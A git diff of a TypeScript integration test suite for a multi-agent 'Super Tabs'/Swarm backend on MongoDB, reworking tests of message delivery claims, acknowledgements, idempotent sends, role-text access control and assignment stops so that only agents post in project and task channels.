-    await store.delivery(host, tab, lead, second.id, { type: 'claim', claimId: 'second-claim' })
-    await store.delivery(host, tab, lead, second.id, { type: 'ack', claimId: 'second-claim', receipt: 'unclear', uncertain: true })
+    await store.delivery(owner, tab, ada, second.id, { type: 'claim', claimId: 'second-claim' })
+    await store.delivery(owner, tab, ada, second.id, { type: 'ack', claimId: 'second-claim', receipt: 'unclear', uncertain: true })
     await run(tab, { type: 'delivery.resolve', deliveryId: second.id, resolution: 'received' })
-    expect(await store.deliveries(host, tab, lead)).toEqual([])
-    expect(await store.deliveryReceipt(host, tab, lead, second.id)).toEqual({ id: second.id, status: 'confirmed' })
-    await expect(store.deliveryReceipt(peer, tab, lead, second.id)).rejects.toMatchObject({ code: 'FORBIDDEN' })
-    expect((await store.messages(owner, tab, 'lead', {})).messages.at(-1)!.text).toContain('confirmed')
+    expect(await store.deliveries(owner, tab, ada)).toEqual([])
+    expect(await store.deliveryReceipt(owner, tab, ada, second.id)).toEqual({ id: second.id, status: 'confirmed' })
+    await expect(store.deliveryReceipt(peer, tab, ada, second.id)).rejects.toMatchObject({ code: 'FORBIDDEN' })
+    expect((await store.messages(owner, tab, chat, {})).messages.at(-1)!.text).toContain('confirmed')
   })
 
   it('a viewer cannot resolve input and a changed machine grant cannot be used to resend it', async () => {
     const { tab, lead } = await fixture()
     await invite(tab, 'viewer')
-    await run(tab, message('Do not replay after revocation.'))
+    // From the owner's own agent, whose grant is not the share the test revokes: only agents post in a project's channel (agentsOnly.test.ts).
+    const { ada } = await ownAgent(tab)
+    await run(tab, { ...message('Do not replay after revocation.'), recipientIds: [lead] } as Command, owner, ada)
     const delivery = (await store.deliveries(host, tab, lead))[0]!
     await store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: 'claim' })
     await store.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'unclear', uncertain: true })
@@ -1618,13 +1324,16 @@ describe('Super Tabs on a real Mongo replica set', () => {
     const created = await Promise.all(Array.from({ length: 5 }, () => store.create(owner, operationId, 'Concurrent')))
     expect(new Set(created.map(c => c.id)).size).toBe(1)
     await expect(store.create(owner, operationId, 'Different')).rejects.toMatchObject({ code: 'OPERATION_REUSED' })
-    const { tab, lead } = await fixture()
-    const sendId = randomUUID()
-    const sends = await Promise.all(Array.from({ length: 5 }, () => run(tab, message('Exactly once.'), owner, undefined, sendId)))
+    // To the owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, say } = await ownAgent(tab)
+    const sendId = randomUUID(), exactly = say('Exactly once.')
+    const sends = await Promise.all(Array.from({ length: 5 }, () => run(tab, exactly, owner, undefined, sendId)))
     expect(new Set(sends.map(s => s.result.messageId)).size).toBe(1)
-    expect(await db.superTabMessage.count({ where: { tabId: tab } })).toBe(1)
-    expect(await store.deliveries(host, tab, lead)).toHaveLength(1)
-    await expect(run(tab, message('Different'), owner, undefined, sendId)).rejects.toMatchObject({ code: 'OPERATION_REUSED' })
+    // And the rows naming who added the Lead (#2207) and Ada.
+    expect(await db.superTabMessage.count({ where: { tabId: tab, text: 'Exactly once.' } })).toBe(1)
+    expect(await store.deliveries(owner, tab, ada)).toHaveLength(1)
+    await expect(run(tab, say('Different'), owner, undefined, sendId)).rejects.toMatchObject({ code: 'OPERATION_REUSED' })
   })
 
   it('joins without machine access, permits viewers to leave, and denies stale access after removal', async () => {
@@ -1641,44 +1350,6 @@ describe('Super Tabs on a real Mongo replica set', () => {
     await expect(store.read({ ...owner, autonomousEnv: 'stag' }, tab)).rejects.toMatchObject({ code: 'NOT_FOUND' })
   })
 
-  // An older CLI's rule lands in the project's instructions as a save, naming the person whose message the Lead quotes
-  // (project instructions, phase 4).
-  it('writes the Lead\'s rule into the instructions, naming the person it quotes, and never a row the system wrote', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const said = (await run(tab, message('Never use Haiku.'))).result.messageId as string
-    const other = (await run(tab, message('Use Haiku for docs.'), peer)).result.messageId as string
-    const rule = (messageId: string, text = 'Never use Haiku.'): Command => ({ type: 'rule.set', rule: { kind: 'forbidModel', model: 'haiku' }, text,
-      askedIn: { conversationId: 'lead', messageId } })
-    await expect(run(tab, rule('missing'), host, lead)).rejects.toMatchObject({ code: 'ASKED_BY_REQUIRED' })
-    expect((await run(tab, rule(said), host, lead)).result).toMatchObject({ projectId: 'lead', revision: 2 })
-    expect((await run(tab, rule(other, 'Haiku writes docs.'), host, lead)).result).toMatchObject({ revision: 3 })
-    const revisions = await db.superTabInstructionsRevision.findMany({ where: { tabId: tab, projectId: 'lead' }, orderBy: { revision: 'asc' } })
-    expect(revisions.map(r => [r.revision, r.askedBy, r.summary])).toEqual([[1, owner.sub, expect.any(String)],
-      [2, owner.sub, 'Routing: Never use Haiku.'], [3, peer.sub, 'Routing: Haiku writes docs.']])
-    expect((await store.read(owner, tab)).state).not.toHaveProperty('rules')
-    // The save's own row is the system's: quoting it names no one.
-    const row = (await store.messages(owner, tab, 'lead', {})).messages.find(m => m.text.includes('changed the instructions'))!
-    await expect(run(tab, rule(row.id), host, lead)).rejects.toMatchObject({ code: 'ASKED_BY_REQUIRED' })
-  })
-  it('lets a project\'s Lead write a rule from the owner\'s message into that project\'s instructions, and answers a removal', async () => {
-    // Backend v1.3.14 refused it: a Swarm of projects has no 'lead' chat.
-    const tab = (await store.create(owner, randomUUID(), 'Projects')).id
-    const { projectId, conversationId: chat } = (await run(tab, { type: 'project.create', name: 'App', visibility: 'public', brief: '' })).result as { projectId: string; conversationId: string }
-    await run(tab, { type: 'project.delete', projectId: 'lead' })
-    const lead = (await run(tab, { type: 'agent.add', conversationId: chat, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Lead', configuration: config, lead: true })).result.agentId as string
-    const said = (await run(tab, { ...message('Only use this Mac.'), conversationId: chat } as Command)).result.messageId as string
-    const askedIn = { conversationId: chat, messageId: said }
-    expect((await run(tab, { type: 'rule.set', rule: { kind: 'machines', machineIds: ['test-host'] }, text: 'Only this Mac.', askedIn }, host, lead)).result)
-      .toMatchObject({ projectId, revision: 2 })
-    expect((await store.instructions(owner, tab, projectId)).text).toContain('- Only this Mac.')
-    expect((await run(tab, { type: 'rule.remove', ruleId: 'old', askedIn }, host, lead)).result).toMatchObject({ ignored: true })
-    expect((await store.read(owner, tab)).state).not.toHaveProperty('rules')
-    const rows = (await store.messages(owner, tab, chat, {})).messages.filter(m => m.source).map(m => m.text)
-    expect(rows).toEqual(['Lead changed the instructions for owner: Routing: Only this Mac.'])
-    expect((await store.read(owner, tab)).state.projects!.map(p => p.id)).toEqual([projectId])
-  })
   it('keeps a new Swarm\'s folder from tab.project on its first project, so the repository can be shared and the host uses it', async () => {
     // Review of #1598: a new Swarm stores its first project, which tab.project left without the folder.
     const tab = (await store.create(owner, randomUUID(), 'Folder')).id
@@ -1691,139 +1362,44 @@ describe('Super Tabs on a real Mongo replica set', () => {
     await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
     await run(tab, { type: 'machine.contribute', machineId: 'test-host', name: 'Host', cwd: '/swarm-root', scope: 'swarm', engines: ['codex'], maxAgents: 2 }, host)
     const pool = (await poolRows(store, host, 'test-host')).find(p => p.tabId === tab)!
-    const team = await teamMachine('test-host')
-    await store.observeMachine(team.session, tab, 'test-host', { generation: pool.machine.generation,
+    await store.observeMachine(host, tab, 'test-host', { generation: pool.machine.generation,
       resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, projectDiskFreeBytes: 100e9,
         diskFreeBytes: 100e9, diskTotalBytes: 500e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null },
-      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [], privacy: team.privacy })
-    const request = { conversationId: 'lead', machineId: 'test-host', engine: 'codex', name: 'Builder', cwd: '/work/app', worktree: true,
+      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [] })
+    // Started in the project's task: the project chat holds only its coordinator among agents (#2207).
+    const task = String((await run(tab, { type: 'conversation.create', title: 'App work', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: task, machineId: 'test-host', engine: 'codex', name: 'Builder', cwd: '/work/app', worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
-    await run(tab, { type: 'agent.start', request })
-    expect((await poolRows(store, team.session, 'test-host')).find(p => p.tabId === tab)!.projects).toEqual([expect.objectContaining({ id: 'lead', repository })])
-  })
-  it('answers an older client\'s skill change and keeps it nowhere, while the host reads the mode stored before', async () => {
-    const tab = (await store.create(owner, randomUUID(), 'Skills')).id
-    await invite(tab)
-    const { projectId, conversationId: chat } = (await run(tab, { type: 'project.create', name: 'App', visibility: 'public', brief: '' }, peer)).result as { projectId: string; conversationId: string }
-    const lead = (await run(tab, { type: 'agent.add', conversationId: chat, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Lead', configuration: config, lead: true }, peer)).result.agentId as string
-    const legacyLead = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Old', configuration: config, lead: true })).result.agentId as string
-    const modes = async () => Object.fromEntries((await rosterRows(store, host, 'test-host')).filter(r => r.tabId === tab).map(r => [r.agent?.id, r.skillMode]))
-    expect(await modes()).toEqual({ [lead]: 'default', [legacyLead]: 'default' })
-    const say = async (text: string, user = peer) => (await run(tab, { ...message(text), conversationId: chat } as Command, user)).result.messageId as string
-    const skills = (messageId: string): Command => ({ type: 'project.skills', projectId, mode: 'orchestration', askedIn: { conversationId: chat, messageId } })
-    expect((await run(tab, skills(await say('Use Harness orchestration.')), host, lead)).result).toMatchObject({ ignored: true })
-    expect((await run(tab, { type: 'project.skills', projectId, mode: 'orchestration' }, peer)).result).toMatchObject({ ignored: true })
-    expect(await modes()).toEqual({ [lead]: 'default', [legacyLead]: 'default' })
-    expect((await store.messages(owner, tab, chat, {})).messages.filter(m => m.text.startsWith('Skills:'))).toEqual([])
-    // A mode an older client stored before still reaches the host.
-    await seedProject(tab, projectId, { skillSet: 'orchestration', skillMode: 'orchestration' })
-    expect(await modes()).toEqual({ [lead]: 'orchestration', [legacyLead]: 'default' })
-    await seedProject(tab, projectId, { skillSet: 'default', skillMode: 'default' })
-    // A project stored before skill modes keeps Harness orchestration.
-    const state = await storedState(tab)
-    delete state.projects!.find(p => p.id === 'lead')!.skillMode
-    await saveState(tab, state)
-    expect(await modes()).toEqual({ [lead]: 'default', [legacyLead]: 'orchestration' })
-  })
-  it('keeps custom role texts out of the tab and the host rows, and serves a text only to the project owner, its Lead and its agents\' hosts', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Worker', configuration: config, lead: false })).result.agentId as string
-    const version = (text: string) => createHash('sha256').update(text).digest('hex').slice(0, 16)
-    const roles = [{ id: 'lead', name: 'Product Manager', kind: 'lead' as const, text: 'LEAD-TEXT' },
-      { id: 'dev', name: 'Engineer', kind: 'builder' as const, text: 'DEV-TEXT' }, { id: 'review', name: 'Reviewer', kind: 'reviewer' as const, text: 'REVIEW-TEXT' }]
-    // The set an older client stored before project instructions.
-    await seedProject(tab, 'lead', {}, roles)
-    const rows = async () => (await rosterRows(store, host, 'test-host')).filter(r => r.tabId === tab)
-    const rowOf = async (id: string) => (await rows()).find(r => r.agent.id === id)!
-    expect(await rowOf(worker)).not.toHaveProperty('role')
-    await seedProject(tab, 'lead', { skillSet: 'custom', skillMode: 'default' })
-    expect(await rowOf(lead)).toMatchObject({ skillMode: 'default', role: { id: 'lead', name: 'Product Manager', kind: 'lead', version: version('LEAD-TEXT'), projectId: 'lead' } })
-    expect(await rowOf(worker)).toMatchObject({ skillMode: 'default', role: { id: 'dev', name: 'Engineer', kind: 'builder', version: version('DEV-TEXT'), projectId: 'lead' } })
-    const stored = JSON.stringify(await storedState(tab))
-    for (const text of [JSON.stringify(await rows()), stored, JSON.stringify((await store.read(owner, tab)).state)]) expect(text).not.toMatch(/LEAD-TEXT|DEV-TEXT/)
-
-    const text = (user: AuthUser, roleId: string, asAgentId?: string) => app.inject({ method: 'GET',
-      url: `/api/super-tabs/${tab}/projects/lead/roles/${roleId}${asAgentId ? `?asAgentId=${asAgentId}` : ''}`, headers: { authorization: `Bearer ${user.sub}` } })
-    for (const [user, as] of [[owner], [host], [host, lead]] as Array<[AuthUser, string?]>) {
-      const answer = await text(user, 'dev', as)
-      expect(answer.statusCode, answer.body).toBe(200)
-      expect(answer.json().data).toEqual({ version: version('DEV-TEXT'), text: 'DEV-TEXT' })
-    }
-    for (const [user, as] of [[peer], [host, worker]] as Array<[AuthUser, string?]>) expect((await text(user, 'dev', as)).statusCode).toBe(404)
-    expect((await text(owner, 'aaaaaaaaaaaa')).statusCode).toBe(404)
-    // A host reads a text only while it could host the agent now: its machine active and the contributor's share grant live.
-    const share = await db.machineShare.findUniqueOrThrow({ where: { machineId: 'test-host' } })
-    await db.machineShare.update({ where: { machineId: 'test-host' }, data: { emails: [] } })
-    try { expect((await text(host, 'dev')).statusCode).toBe(404) } finally {
-      await db.machineShare.update({ where: { machineId: 'test-host' }, data: { emails: share.emails } })
-    }
-    await db.machine.update({ where: { machineId: 'test-host' }, data: { deletedAt: new Date() } })
-    try { expect((await text(host, 'dev')).statusCode).toBe(404) } finally {
-      await db.machine.update({ where: { machineId: 'test-host' }, data: { deletedAt: null } })
-    }
-    expect((await text(host, 'dev')).statusCode).toBe(200)
-
-    // An older client's role saves are answered and kept nowhere (project instructions, phase 4): the stored texts stay.
-    for (const command of [{ type: 'project.role.set', projectId: 'lead', role: { ...roles[1]!, text: 'DEV-TEXT v2' } },
-      { type: 'project.role.remove', projectId: 'lead', roleId: 'review' }, { type: 'project.roles.reset', projectId: 'lead', roles: roles.slice(0, 2) }] as Command[]) {
-      expect((await run(tab, command)).result).toMatchObject({ ignored: true })
-    }
-    expect((await rowOf(worker)).role).toMatchObject({ id: 'dev', version: version('DEV-TEXT'), projectId: 'lead' })
-    expect((await text(owner, 'dev')).json().data).toEqual({ version: version('DEV-TEXT'), text: 'DEV-TEXT' })
-    expect(await db.superTabRoleText.count({ where: { tabId: tab } })).toBe(3)
-
-    // A deleted project takes its stored texts with it.
-    const other = (await run(tab, { type: 'project.create', name: 'Other', visibility: 'public', brief: '' })).result.projectId as string
-    await seedProject(tab, other, {}, roles)
-    expect(await db.superTabRoleText.count({ where: { tabId: tab, projectId: other } })).toBe(3)
-    await run(tab, { type: 'project.delete', projectId: other })
-    expect(await db.superTabRoleText.count({ where: { tabId: tab, projectId: other } })).toBe(0)
-  })
-  it('serves no role text once the reader, or the hosted agent\'s contributor, left the Swarm\'s Workspace, before that removal reaches the Swarm', async () => {
-    const { tab } = await fixture()
-    await invite(tab)
-    await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(), name: 'Worker', configuration: config, lead: false })
-    await seedProject(tab, 'lead', { skillSet: 'custom', skillMode: 'default' }, [{ id: 'lead', name: 'Product Manager', kind: 'lead', text: 'LEAD-TEXT' },
-      { id: 'dev', name: 'Engineer', kind: 'builder', text: 'DEV-TEXT' }])
-    const text = (user: AuthUser) => app.inject({ method: 'GET', url: `/api/super-tabs/${tab}/projects/lead/roles/dev`, headers: { authorization: `Bearer ${user.sub}` } })
-    expect((await text(owner)).statusCode).toBe(200)
-    expect((await text(host)).statusCode).toBe(200)
-    // The owner, who is the project's owner and the Worker's contributor, is marked removed as a removal leaves it before its cleanup.
-    const row = await db.superTab.findUniqueOrThrow({ where: { id: tab } })
-    await db.swarmWorkspaceMember.update({ where: { id: `${row.workspaceId}:${owner.sub}` }, data: { removedAt: new Date() } })
-    try {
-      for (const user of [owner, host]) {
-        const answer = await text(user)
-        expect(answer.statusCode, user.email).not.toBe(200)
-        expect(answer.body).not.toContain('DEV-TEXT')
-      }
-    } finally { await db.swarmWorkspaceMember.update({ where: { id: `${row.workspaceId}:${owner.sub}` }, data: { removedAt: null } }) }
+    // The machine's own person starts it (Swarm v3, task #4120).
+    await run(tab, { type: 'agent.start', request }, host)
+    expect((await poolRows(store, host, 'test-host')).find(p => p.tabId === tab)!.projects).toEqual([expect.objectContaining({ id: 'lead', repository })])
   })
   it('writes a message to several recipients in two insert commands, preserving each delivery', async () => {
     const { tab, lead } = await fixture()
-    const recipients = [lead]
-    for (const name of ['Parser', 'Renderer', 'Exporter']) recipients.push(String((await run(tab, {
-      type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(), name, configuration: config, lead: false,
+    // In a task, which holds its coordinator: the project chat holds no other agent (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    // A planner in the task writes to the four: only agents post in a task's chat (agentsOnly.test.ts).
+    const added: string[] = []
+    for (const name of ['Planner', 'Parser', 'Renderer', 'Exporter']) added.push(String((await run(tab, {
+      type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(), name, configuration: config, lead: false,
     })).result.agentId))
+    const [planner, ...workers] = added
+    const recipients = [lead, ...workers]
     const queries: string[] = []
     recordQuery = query => { if (/SuperTab(Message|Delivery).*insert/i.test(query)) queries.push(query) }
     let sent: Awaited<ReturnType<typeof run>>
     try {
-      sent = await run(tab, { ...message('Batch to all four.'), recipientIds: recipients } as Command)
+      sent = await run(tab, { ...message('Batch to all four.'), conversationId: group, recipientIds: recipients } as Command, host, planner)
     } finally { recordQuery = () => {} }
     const messageId = String(sent.result.messageId)
     const stored = await db.superTabMessage.findUniqueOrThrow({ where: { id: messageId } })
-    expect(stored).toMatchObject({ tabId: tab, conversationId: 'lead', text: 'Batch to all four.', recipientIds: recipients,
-      author: { kind: 'person', id: owner.sub }, replyTo: null, mentions: [] })
+    expect(stored).toMatchObject({ tabId: tab, conversationId: group, text: 'Batch to all four.', recipientIds: recipients,
+      author: { kind: 'agent', id: planner }, replyTo: null, mentions: [] })
     const deliveries = await db.superTabDelivery.findMany({ where: { tabId: tab, messageId } })
     expect(deliveries).toHaveLength(4)
     for (const recipient of recipients) expect(deliveries.find(row => row.agentId === recipient)).toMatchObject({
-      id: stableId(messageId, recipient), tabId: tab, conversationId: 'lead', messageId, machineId: 'test-host',
-      machineOwnerId: host.sub, membershipGeneration: tab, authorKind: 'person', authorId: owner.sub,
+      id: stableId(messageId, recipient), tabId: tab, conversationId: group, messageId, machineId: 'test-host',
+      machineOwnerId: host.sub, membershipGeneration: tab, authorKind: 'agent', authorId: planner,
       authorGeneration: tab, assignmentId: null, status: 'queued',
     })
     expect(queries).toHaveLength(2)
@@ -1831,170 +1407,130 @@ describe('Super Tabs on a real Mongo replica set', () => {
 
   it('closes the replying agent\'s own deliveries of a message as answered, and nobody else\'s', async () => {
     const { tab, lead } = await fixture()
-    const helper = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
+    // In a task, which holds its coordinator: the project chat holds no other agent (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const helper = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Helper', configuration: config, lead: false })).result.agentId as string
-    await invite(tab)
-    const asked = await run(tab, { type: 'message.send', conversationId: 'lead', text: 'What is the status?', replyTo: null,
-      recipientIds: [lead, helper] }, peer)
+    // Another agent of the task asks: only agents post in a task's chat (agentsOnly.test.ts).
+    const asker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
+      name: 'Asker', configuration: config, lead: false })).result.agentId as string
+    const asked = await run(tab, { type: 'message.send', conversationId: group, text: 'What is the status?', replyTo: null,
+      recipientIds: [lead, helper] }, host, asker)
     const messageId = asked.result.messageId as string
     const held = (await store.deliveries(host, tab, lead))[0]!
     const claimId = randomUUID()
     // A claimed delivery closes too, not only a queued one.
     await store.delivery(host, tab, lead, held.id, { type: 'claim', claimId })
     const other = (await store.deliveries(host, tab, helper))[0]!
-    // A person's reply closes nothing.
-    await run(tab, { type: 'message.send', conversationId: 'lead', text: 'Also, soon please.', replyTo: messageId, recipientIds: [] })
+    // The asker's own reply closes nothing.
+    await run(tab, { type: 'message.send', conversationId: group, text: 'Also, soon please.', replyTo: messageId, recipientIds: [] }, host, asker)
     expect(await store.deliveryReceipt(host, tab, lead, held.id)).toEqual({ id: held.id, status: 'claimed' })
-    await run(tab, { type: 'message.send', conversationId: 'lead', text: 'It is done.', replyTo: messageId, recipientIds: [] }, host, lead)
+    await run(tab, { type: 'message.send', conversationId: group, text: 'It is done.', replyTo: messageId, recipientIds: [] }, host, lead)
     expect(await store.deliveryReceipt(host, tab, lead, held.id)).toEqual({ id: held.id, status: 'answered' })
     expect((await store.deliveries(host, tab, lead)).map(d => d.messageId)).not.toContain(messageId)
     expect(await store.deliveryReceipt(host, tab, helper, other.id)).toEqual({ id: other.id, status: 'queued' })
     await expect(store.delivery(host, tab, lead, held.id, { type: 'claim', claimId })).rejects.toMatchObject({ code: 'DELIVERY_RESOLVED' })
     await expect(store.delivery(host, tab, lead, held.id, { type: 'ack', claimId, receipt: 'late', uncertain: false }))
       .rejects.toMatchObject({ code: 'DELIVERY_RESOLVED' })
-    const next = await run(tab, { type: 'message.send', conversationId: 'lead', text: 'And the tests?', replyTo: null, recipientIds: [lead] }, peer)
+    const next = await run(tab, { type: 'message.send', conversationId: group, text: 'And the tests?', replyTo: null, recipientIds: [lead] }, host, asker)
     const queued = (await store.deliveries(host, tab, lead)).find(d => d.messageId === next.result.messageId)!
-    await run(tab, { type: 'message.send', conversationId: 'lead', text: 'They pass.', replyTo: next.result.messageId as string, recipientIds: [] }, host, lead)
+    await run(tab, { type: 'message.send', conversationId: group, text: 'They pass.', replyTo: next.result.messageId as string, recipientIds: [] }, host, lead)
     expect(await store.deliveryReceipt(host, tab, lead, queued.id)).toEqual({ id: queued.id, status: 'answered' })
   })
 
-  it('durably resumes a claim, never steals it on timeout, and does not resurrect revoked messages on rejoin', async () => {
+  // Answers go right below, not in a thread (anh Dee, 2026-11-04; task #2929).
+  it('closes an agent\'s delivery when it answers right below the message, which opens no thread', async () => {
+    // The owner asks their own agent in their chat with it: a person posts in no project's channel (agentsOnly.test.ts).
     const { tab, lead } = await fixture()
-    await invite(tab)
-    await run(tab, message('Instruction from a collaborator.'), peer)
-    const delivery = (await store.deliveries(host, tab, lead))[0]!
+    const { ada, chat, say } = await ownAgent(tab)
+    const asked = await run(tab, say('What is the status?'))
+    const messageId = asked.result.messageId as string
+    const held = (await store.deliveries(owner, tab, ada)).find(d => d.messageId === messageId)!
+    const answered = await run(tab, { type: 'message.send', conversationId: chat, text: 'It is done.', replyTo: null, answers: messageId,
+      recipientIds: [] } as Command, owner, ada)
+    expect(await store.deliveryReceipt(owner, tab, ada, held.id)).toEqual({ id: held.id, status: 'answered' })
+    const page = await store.messages(owner, tab, chat, {})
+    const answer = page.messages.find(m => m.id === answered.result.messageId)!
+    expect(answer).toMatchObject({ replyTo: null })
+    expect(answer.thread ?? answer.id).toBe(answer.id)
+    // The question shows as an ordinary message: no thread under it.
+    expect(page.threads.find(t => t.id === messageId)?.replies ?? 0).toBe(0)
+    // A message of another conversation is not one to answer here.
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    await expect(run(tab, { type: 'message.send', conversationId: group, text: 'Here.', replyTo: null, answers: messageId, recipientIds: [] } as Command, host, lead))
+      .rejects.toMatchObject({ code: 'INVALID_ANSWER' })
+  })
+
+  it('durably resumes a claim and never steals it on timeout', async () => {
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, say } = await ownAgent(tab)
+    await run(tab, say('Instruction from a collaborator.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
     const claimId = randomUUID()
-    const first = await store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId })
+    const first = await store.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId })
     expect(first.delivery.status).toBe('claimed')
     // Simulate a backend restart: no in-memory object carries delivery ownership.
     const restarted = new SuperTabStore(db)
-    expect((await restarted.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId })).message!.text).toContain('collaborator')
-    await expect(restarted.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() })).rejects.toMatchObject({ code: 'CLAIM_CONFLICT' })
-    await run(tab, { type: 'member.remove', userId: peer.sub })
-    await invite(tab)
-    expect(await store.deliveries(host, tab, lead)).toHaveLength(0)
-    await expect(store.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId, receipt: 'receipt', uncertain: false })).rejects.toMatchObject({ code: 'DELIVERY_REVOKED' })
-    expect((await store.messages(owner, tab, 'lead', {})).messages).toHaveLength(1)
+    expect((await restarted.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId })).message!.text).toContain('collaborator')
+    await expect(restarted.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: randomUUID() })).rejects.toMatchObject({ code: 'CLAIM_CONFLICT' })
   })
 
   it('allows one claim winner and preserves the original native receipt', async () => {
-    const { tab, lead } = await fixture()
-    await run(tab, message('One native turn.'))
-    const delivery = (await store.deliveries(host, tab, lead))[0]!
-    const claims = await Promise.allSettled([randomUUID(), randomUUID()].map(claimId => store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId })))
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, say } = await ownAgent(tab)
+    await run(tab, say('One native turn.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
+    const claims = await Promise.allSettled([randomUUID(), randomUUID()].map(claimId => store.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId })))
     expect(claims.filter(r => r.status === 'fulfilled')).toHaveLength(1)
     const won = claims.find(r => r.status === 'fulfilled')!
     if (won.status !== 'fulfilled') throw new Error('No claim winner')
     const claimId = won.value.delivery.claimId!
-    await store.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId, receipt: 'native-turn-1', uncertain: false })
-    await store.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId, receipt: 'native-turn-1', uncertain: false })
-    await expect(store.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId, receipt: 'different', uncertain: false })).rejects.toMatchObject({ code: 'RECEIPT_CONFLICT' })
-    expect(await store.deliveries(host, tab, lead)).toHaveLength(0)
+    await store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId, receipt: 'native-turn-1', uncertain: false })
+    await store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId, receipt: 'native-turn-1', uncertain: false })
+    await expect(store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId, receipt: 'different', uncertain: false })).rejects.toMatchObject({ code: 'RECEIPT_CONFLICT' })
+    expect(await store.deliveries(owner, tab, ada)).toHaveLength(0)
   })
 
-  it('serializes revocation against claims and exposes no pending instruction after removal', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    await run(tab, message('Racing with removal.'), peer)
-    const delivery = (await store.deliveries(host, tab, lead))[0]!
-    const results = await Promise.allSettled([
-      store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() }),
-      run(tab, { type: 'member.remove', userId: peer.sub }),
-    ])
-    expect(results[1]!.status).toBe('fulfilled')
-    expect(await store.deliveries(host, tab, lead)).toHaveLength(0)
-    expect((await db.superTabDelivery.findUnique({ where: { id: delivery.id } }))!.status).toBe('cancelled')
-  })
-
-  it('holds a cross-tab assignment until host-confirmed stop and retains the previous attempt', async () => {
+  it('holds an assignment until host-confirmed stop', async () => {
     const one = await fixture()
-    const two = await fixture()
     const session = randomUUID()
-    const attach: Command = { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: session,
-      name: 'Worker', configuration: config, lead: false }
-    const worker = (await run(one.tab, attach)).result.agentId as string
-    await run(two.tab, attach)
-    const define: Command = { type: 'work.define', conversationId: 'lead', brief: 'Check the fixture.', checks: [{ description: 'Test passes.', independent: true }] }
-    await run(one.tab, define); await run(two.tab, define)
-    const assignmentId = (await run(one.tab, { type: 'work.assign', conversationId: 'lead', agentId: worker })).result.assignmentId as string
-    await expect(run(two.tab, { type: 'work.assign', conversationId: 'lead', agentId: worker })).rejects.toMatchObject({ code: 'AGENT_BUSY' })
+    // The work is in a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(one.tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const worker = (await run(one.tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: session,
+      name: 'Worker', configuration: config, lead: false })).result.agentId as string
+    const assignmentId = (await storeAssignment(db, one.tab, group, worker)).id
     await run(one.tab, { type: 'agent.remove', agentId: worker })
     expect(await assignmentRows(store, host, 'test-host')).toContainEqual({ tabId: one.tab, assignmentId, harnessId: session })
     await expect(assignmentRows(store, owner, 'test-host')).rejects.toMatchObject({ code: 'HOST_UNAVAILABLE' })
     await expect(store.stopped(owner, one.tab, assignmentId, 'forged')).rejects.toMatchObject({ code: 'FORBIDDEN' })
     await store.stopped(host, one.tab, assignmentId, 'native-stop-receipt')
-    expect((await store.read(owner, one.tab)).state.conversations[0]!.assignment?.status).toBe('stopped')
+    expect((await store.read(owner, one.tab)).state.conversations.find(c => c.id === group)!.assignment?.status).toBe('stopped')
